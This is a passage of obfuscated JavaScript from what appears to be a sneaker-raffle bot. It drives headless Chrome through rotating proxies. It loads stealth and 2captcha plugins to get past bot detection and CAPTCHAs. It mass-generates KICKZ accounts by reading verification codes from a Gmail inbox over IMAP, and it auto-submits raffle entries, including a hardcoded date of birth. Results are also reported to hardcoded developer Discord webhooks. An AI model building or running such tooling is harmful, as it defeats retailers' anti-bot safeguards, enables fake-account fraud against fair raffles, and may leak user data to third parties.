                    _0x369d34(_0x1e9b31['name'] + '\x20Task\x20' + (_0x50040e + 0x1) + '\x20/\x20' + _0x130601['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                    try {
                        await _0x32ecbd(_0x130601, _0x50040e);
                    } catch {
                        _0x56864c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x2f06ea = await _0x4a5b92(_0x130601[_0x50040e], _0x1e9b31, 'dev', ![]), _0x514ac6 = await _0x4a5b92(_0x130601[_0x50040e], _0x1e9b31, 'pub', ![]);
                    const _0x360762 = {
                        'succesDEVMSG': { 'embeds': [_0x2f06ea] },
                        'succesPUBMSG': { 'embeds': [_0x514ac6] }
                    };
                    if (_0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '')
                        try {
                            await _0x265172(_0x33c579['webhook'], _0x360762['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x360762['succesDEVMSG']), await _0x4b01dc(0xc8);
                    try {
                        await _0x265172(_0x2c2f0f, _0x360762['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x130601[_0x50040e]['Email'] == '' || _0x130601[_0x50040e]['Url'] == '' || _0x130601[_0x50040e]['FirstName'] == '' || _0x130601[_0x50040e]['LastName'] == '') {
                        console['log'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x33c579['useRandomProxy'] = ![])
                        var _0x3e54ae = _0x41b4c8[_0x50040e]['split'](':');
                    else
                        var _0x2c337a = Math['round'](Math['random']() * (_0x41b4c8['length'] - 0x1)), _0x3e54ae = _0x41b4c8[_0x2c337a]['split'](':');
                    var _0x46a2b2;
                    try {
                        _0x46a2b2 = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3e54ae[0x0] + ':' + _0x3e54ae[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x46a2b2 = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3e54ae[0x0] + ':' + _0x3e54ae[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1dc494 = await _0x46a2b2['newPage']();
                        await _0x1dc494['authenticate']({
                            'username': '' + _0x3e54ae[0x2],
                            'password': '' + _0x3e54ae[0x3]
                        }), console['log'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1dc494['setRequestInterception'](!![]), _0x1dc494['on']('request', _0x350092 => {
                            _0x350092['resourceType']() === 'image' || _0x350092['resourceType']() === 'font' || _0x350092['resourceType']() === 'media' ? _0x350092['abort']() : _0x350092['continue']();
                        });
                        try {
                            await _0x1dc494['goto']('' + _0x130601[_0x50040e]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x1dc494['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1dc494['type']('#comp_firstname', '' + _0x130601[_0x50040e]['FirstName']), await _0x1dc494['waitForSelector']('#comp_lastname'), await _0x1dc494['type']('#comp_lastname', '' + _0x130601[_0x50040e]['LastName']), await _0x1dc494['waitForSelector']('#comp_email'), await _0x1dc494['type']('#comp_email', '' + _0x130601[_0x50040e]['Email']), await _0x1dc494['waitForSelector']('#comp_paypalemail'), await _0x1dc494['type']('#comp_paypalemail', '' + _0x130601[_0x50040e]['Email']), await _0x1dc494['waitForSelector']('#comp_mobile_end'), await _0x1dc494['type']('#comp_mobile_end', '' + _0x130601[_0x50040e]['Phone']), await _0x1dc494['waitForSelector']('#comp_dob'), await _0x1dc494['type']('#comp_dob', '08/09/1992'), console['log'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x130601[_0x50040e]['Size'] == 'RANDOM') {
                            const _0x4b8e8f = await _0x1dc494['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x35ae97 => {
                                return _0x35ae97['map'](_0x574853 => _0x574853['value']);
                            });
                            var _0x241a9c = Math['round'](Math['random']() * (_0x4b8e8f['length'] - 0x2));
                            await _0x1dc494['select']('#shoesize', _0x4b8e8f[_0x241a9c + 0x1]), await _0x4b01dc(0x3e8);
                        } else {
                            const _0x27f164 = await _0x1dc494['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x35c873 => {
                                return _0x35c873['map'](_0x542d54 => _0x542d54['innerText']);
                            }), _0xa5dc32 = await _0x1dc494['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3ac315 => {
                                return _0x3ac315['map'](_0x3d813f => _0x3d813f['value']);
                            });
                            var _0x156e98 = _0x130601[_0x50040e]['Size'];
                            for (var _0x2f1b27 = 0x1; _0x2f1b27 < _0xa5dc32['length']; _0x2f1b27++) {
                                var _0x4aa868 = _0x27f164[_0x2f1b27]['split']('\x20')[0x0];
                                if (_0x4aa868 == _0x156e98) {
                                    await _0x1dc494['select']('#shoesize', _0xa5dc32[_0x2f1b27]);
                                    break;
                                } else {
                                    if (_0x2f1b27 + 0x1 == _0xa5dc32['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x1dc494['waitForSelector']('#comp_address1'), await _0x1dc494['type']('#comp_address1', _0x130601[_0x50040e]['Address1'] + '\x20' + _0x130601[_0x50040e]['HouseNumber']), await _0x1dc494['waitForSelector']('#comp_address2'), await _0x1dc494['type']('#comp_address2', '' + _0x130601[_0x50040e]['Address2']), await _0x1dc494['waitForSelector']('#comp_address2'), await _0x1dc494['type']('#comp_address3', '' + _0x130601[_0x50040e]['City']), await _0x1dc494['waitForSelector']('#comp_postcode'), await _0x1dc494['type']('#comp_postcode', '' + _0x130601[_0x50040e]['Zip']), console['log'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4b01dc(0x4b0), await _0x1dc494['click']('label#emailhold'), await _0x4b01dc(0x5dc), await _0x1dc494['click']('#preauth_tandc_email\x20>\x20label'), await _0x4b01dc(0x5dc), await _0x1dc494['click']('#submit');
                        try {
                            await _0x1dc494['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20' + _0xd12810['blue']('Awaiting\x20Paypal\x20Payment')), _0x46a2b2['on']('targetcreated', async _0x1e443f => {
                            if (_0x1e443f['type']() === 'page') {
                                const _0x5ec255 = await _0x1e443f['page']();
                                async function _0xf5eedd() {
                                    try {
                                        await _0x1dc494['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x578d11 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x2ce533() {
                                    try {
                                        await _0x1dc494['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x1d3739 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x2ce533(), _0xf5eedd(), await _0x4b01dc(0x493e0);
                            }
                        });
                        async function _0x3ef89e() {
                            for (let _0xc5ce4f = 0x0; _0xc5ce4f < 0x12c; _0xc5ce4f++) {
                                if (_0x1d3739 == !![]) {
                                    _0x56864c = 'no', _0x41d22(_0x130601[_0x50040e], _0x1e9b31), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '')
                                        try {
                                            await _0x265172(_0x33c579['webhook'], _0x360762['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x360762['succesDEVMSG']), await _0x4b01dc(0xc8);
                                    try {
                                        await _0x265172(_0x2c2f0f, _0x360762['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x578d11)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x4b01dc(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x4b01dc(0xbb8), await _0x1dc494['click']('.zoid-outlet'), await _0x4b01dc(0x7d0), await _0x3ef89e();
                    } catch (_0xa1f1f0) {
                        console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20' + _0xa1f1f0)), _0x19e585 = '' + _0xa1f1f0;
                        var _0x1b7fdc = await _0x4a5b92(_0x130601[_0x50040e], _0x1e9b31, 'dev', !![], _0x19e585);
                        _0x360762['errorDEV'] = { 'embeds': [_0x1b7fdc] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x360762['errorDEV']), await _0x265172(_0x3cc994, _0x360762['errorDEV']);
                    } finally {
                        _0x46a2b2 && _0x46a2b2['close']();
                        if (_0x56864c == 'yes' && _0x219ec0 != 0x5 && _0x19e585 != 'Size\x20Not\x20Found') {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x1e9b31['name'] + ']\x20Task\x20' + (_0x50040e + 0x1) + '\x20:\x20Retrying\x20(' + _0x219ec0 + '\x20/\x205)')), _0x50040e = _0x50040e - 0x1, _0x219ec0 = _0x219ec0 + 0x1;
                            continue;
                        }
                        _0x56864c == 'yes' && _0x219ec0 >= 0x5 && (_0x2b505c(afew[_0x50040e], _0x1e9b31), _0x56864c = 'no', _0x219ec0 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x14eaae, _0x9ce891, _0x150aa2) {
                    _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x33c579['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x23cc37 = 0x0; _0x23cc37 < _0x9ce891['length']; _0x23cc37++) {
                        const _0x4dd2e4 = 'https://www.kickz.com/login';
                        if (_0x3ae5c9 != 'yes')
                            var _0x3ae5c9 = '', _0xc5e83 = 0x0;
                        _0x369d34(_0x14eaae['name'] + '\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20/\x20' + _0x9ce891['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                        try {
                            await _0x32ecbd(_0x9ce891, _0x23cc37);
                        } catch {
                            _0x3ae5c9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x1fb208 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ebc10
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x33c579['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ddf1c
                                }
                            ]
                        }];
                        const _0x46cfa6 = { 'embeds': _0x1fb208 };
                        var _0x1dc33d = await _0x4a5b92(_0x9ce891[_0x23cc37], _0x14eaae, 'acc', ![]);
                        const _0x1aff03 = { 'succesDEVMSG': { 'embeds': [_0x1dc33d] } };
                        if (_0x9ce891[_0x23cc37]['Email'] == '' || _0x9ce891[_0x23cc37]['FirstName'] == '' || _0x9ce891[_0x23cc37]['LastName'] == '') {
                            console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x9ce891[_0x23cc37]['Password'] == '' && (_0x9ce891[_0x23cc37]['Password'] = 'JRaffles23!');
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0x50517c = _0x150aa2[_0x23cc37]['split'](':');
                        else
                            var _0x7eab76 = Math['round'](Math['random']() * (_0x150aa2['length'] - 0x1)), _0x50517c = _0x150aa2[_0x7eab76]['split'](':');
                        var _0x552f43;
                        try {
                            _0x552f43 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x50517c[0x0] + ':' + _0x50517c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x552f43 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x50517c[0x0] + ':' + _0x50517c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4c389 = await _0x552f43['newPage']();
                            await _0x4c389['authenticate']({
                                'username': '' + _0x50517c[0x2],
                                'password': '' + _0x50517c[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4c389['setRequestInterception'](!![]), _0x4c389['on']('request', _0x436c1a => {
                                _0x436c1a['resourceType']() === 'image' || _0x436c1a['resourceType']() === 'font' || _0x436c1a['resourceType']() === 'media' ? _0x436c1a['abort']() : _0x436c1a['continue']();
                            }), await _0x4c389['goto'](_0x4dd2e4), await _0x4b01dc(0xbb8), console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x4c389['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4c389['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4c389['waitForSelector']('#button-register'), await _0x4b01dc(0x7d0), await _0x4c389['evaluate'](() => {
                                const _0x1e6bba = document['querySelector']('#button-register');
                                _0x1e6bba['click']();
                            }), console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4b01dc(0x1388), await _0x4c389['waitForSelector']('#customer_salutation'), await _0x4c389['select']('#customer_salutation', 'mr'), await _0x4b01dc(0x7d0), await _0x4c389['waitForSelector']('#customer_firstname'), await _0x4c389['type']('#customer_firstname', '' + _0x9ce891[_0x23cc37]['FirstName']), await _0x4b01dc(0x352), await _0x4c389['waitForSelector']('#customer_lastname'), await _0x4c389['type']('#customer_lastname', '' + _0x9ce891[_0x23cc37]['LastName']), await _0x4b01dc(0x352), await _0x4c389['type']('#email-input', '' + _0x9ce891[_0x23cc37]['Email']), await _0x4b01dc(0x352), await _0x4c389['type']('#email-confirm-input', '' + _0x9ce891[_0x23cc37]['Email']), await _0x4b01dc(0x352), await _0x4c389['type']('#register-password', '' + _0x9ce891[_0x23cc37]['Password']), await _0x4b01dc(0x352), await _0x4c389['type']('#password-confirm', '' + _0x9ce891[_0x23cc37]['Password']), await _0x4b01dc(0x352), console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x4c389['click']('#consent'), await _0x4b01dc(0x1f4);
                            const _0x2943eb = await _0x4c389['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x2943eb) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x4c389['click']('#buttonRegister');
                            try {
                                await _0x4c389['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x9ce891[_0x23cc37]['Email']), await _0x4b01dc(0x4b0);
                            async function _0x48ed39() {
                                var _0x1cf821, _0x3647d2 = ![];
                                for (var _0x5820ae = 0x0; _0x5820ae < 0x18; _0x5820ae++) {
                                    async function _0x25a8c6() {
                                        var _0xb6af14 = new _0xc8c5aa({
                                            'user': _0x33c579['masterMail'],
                                            'password': _0x33c579['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x39a0d7(_0x48ce29) {
                                            _0xb6af14['openBox']('INBOX', ![], _0x48ce29);
                                        }
                                        _0xb6af14['once']('ready', function () {
                                            console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x39a0d7(function (_0x22e43b, _0x17b0dd) {
                                                console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x22e43b)
                                                    throw _0x22e43b;
                                                _0xb6af14['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x2ff98f, _0x502cc2) {
                                                    if (!_0x502cc2 || !_0x502cc2['length'])
                                                        console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0xb6af14['end']();
                                                    else {
                                                        var _0x4b200f = _0xb6af14['seq']['fetch'](_0x502cc2, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4b200f['on']('message', function (_0x440ac5, _0x4bfff0) {
                                                            var _0x262c09 = '(#' + _0x4bfff0 + ')\x20';
                                                            _0x440ac5['on']('body', function (_0x5e5cf5, _0x1357d3) {
                                                                _0x1d4048(_0x5e5cf5, (_0x44794e, _0x266059) => {
                                                                    if (_0x266059['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x3a1686 = _0x266059['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x22ea46 = _0x3a1686[0x1]['split']('<')[0x0];
                                                                        _0x1cf821 = _0x22ea46;
                                                                    }
                                                                });
                                                            }), _0x440ac5['once']('end', function () {
                                                            });
                                                        }), _0x4b200f['once']('error', function (_0x13973d) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4b200f['once']('end', function () {
                                                            _0xb6af14['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0xb6af14['once']('error', function (_0x4527f5) {
                                            console['log'](_0xd12810['red'](_0x4527f5['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3647d2 = !![];
                                        }), _0xb6af14['once']('end', async function () {
                                        }), _0xb6af14['connect']();
                                    }
                                    _0x25a8c6(), await _0x4b01dc(0x1388);
                                    if (_0x1cf821)
                                        return _0x1cf821;
                                    if (_0x3647d2)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5820ae == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x48ed39(), _0x4b01dc(0x320), console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Verifying..'), await _0x4c389['type']('#verificationCode', code), await _0x4b01dc(0x1f4), await _0x4c389['click']('#buttonVerify'), await _0x4b01dc(0x190), await _0x4c389['click']('#buttonVerify'), await _0x4b01dc(0x3e8);
                            try {
                                await _0x4c389['waitForSelector']('div.b-user_greeting'), _0x3ae5c9 = 'no', console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Account\x20' + _0x9ce891[_0x23cc37]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3f6207['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x9ce891[_0x23cc37]['Email'] + ',' + _0x9ce891[_0x23cc37]['Password'] + ','), console['log'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Account\x20' + _0x9ce891[_0x23cc37]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x1aff03['succesDEVMSG']);
                                } catch {
                                }
                                await _0x265172(_0x1fa40c, _0x1aff03['succesDEVMSG']);
                            } catch {
                                _0x3ae5c9 = 'no', console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x29d069) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20' + _0x29d069)), _0x1fb208[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x1fb208[0x0]['description'] = '' + _0x29d069, await _0x265172(_0x3cc994, _0x46cfa6), _0x3ae5c9 = 'yes';
                        } finally {
                            _0x552f43 && _0x552f43['close']();
                            if (_0x3ae5c9 == 'yes' && _0xc5e83 != 0x5) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x14eaae['name'] + ']\x20Task\x20' + (_0x23cc37 + 0x1) + '\x20:\x20Retrying\x20(' + _0xc5e83 + '\x20/\x205)')), _0x23cc37 = _0x23cc37 - 0x1, _0xc5e83 = _0xc5e83 + 0x1;
                                continue;
                            }
                            _0x3ae5c9 == 'yes' && _0xc5e83 >= 0x5 && (_0x2b505c(_0x9ce891[_0x23cc37], _0x14eaae), _0x3ae5c9 = 'no', _0xc5e83 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x3da0b1, _0x20e873, _0x559e07) {
                    _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x33c579['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x276607 = 0x0; _0x276607 < _0x20e873['length']; _0x276607++) {
                        var _0x178cc0;
                        if (_0x5d36e8 != 'yes')
                            var _0x5d36e8 = '', _0x3e4e96 = 0x0;
                        _0x369d34(_0x3da0b1['name'] + '\x20Task\x20' + (_0x276607 + 0x1) + '\x20/\x20' + _0x20e873['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                        var _0x4f9778 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ebc10
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x20e873[_0x276607]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x20e873[_0x276607]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x33c579['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ddf1c
                                }
                            ]
                        }];
                        let _0x54debb = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x1734d2 = ![];
                        for (key of _0x54debb) {
                            if (_0x20e873[_0x276607][key] == '' || !_0x20e873[_0x276607][key]) {
                                console['log'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x1734d2 = !![];
                                break;
                            }
                        }
                        if (_0x1734d2) {
                            await _0x4b01dc(0x1f4);
                            continue;
                        }
                        var _0x24c06c = await _0x4a5b92(_0x20e873[_0x276607], _0x3da0b1, 'dev', ![]), _0x3cab64 = await _0x4a5b92(_0x20e873[_0x276607], _0x3da0b1, 'pub', ![]);
                        const _0x339e3b = {
                            'succesDEVMSG': { 'embeds': [_0x24c06c] },
                            'succesPUBMSG': { 'embeds': [_0x3cab64] }
                        };
                        try {
                            await _0x32ecbd(_0x20e873, _0x276607);
                        } catch {
                            _0x5d36e8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0x5e62f6 = _0x559e07[_0x276607]['split'](':');
                        else
                            var _0x40eb6a = Math['round'](Math['random']() * (_0x559e07['length'] - 0x1)), _0x5e62f6 = _0x559e07[_0x40eb6a]['split'](':');
                        var _0x4c5ca2;
                        try {
                            _0x4c5ca2 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5e62f6[0x0] + ':' + _0x5e62f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4c5ca2 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5e62f6[0x0] + ':' + _0x5e62f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x31a524 = await _0x4c5ca2['newPage']();
                            await _0x31a524['authenticate']({
                                'username': '' + _0x5e62f6[0x2],
                                'password': '' + _0x5e62f6[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x31a524['setRequestInterception'](!![]), _0x31a524['on']('request', _0xe372ac => {
                                _0xe372ac['resourceType']() === 'image' || _0xe372ac['resourceType']() === 'font' || _0xe372ac['resourceType']() === 'media' ? _0xe372ac['abort']() : _0xe372ac['continue']();
                            }), await _0x31a524['goto']('' + _0x20e873[_0x276607]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x4b01dc(0x12c), await _0x31a524['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x31a524['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4b01dc(0x7d0);
                            try {
                                await _0x31a524['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x31a524['click']('a[title=\x22sign\x20in\x22]');
                            }
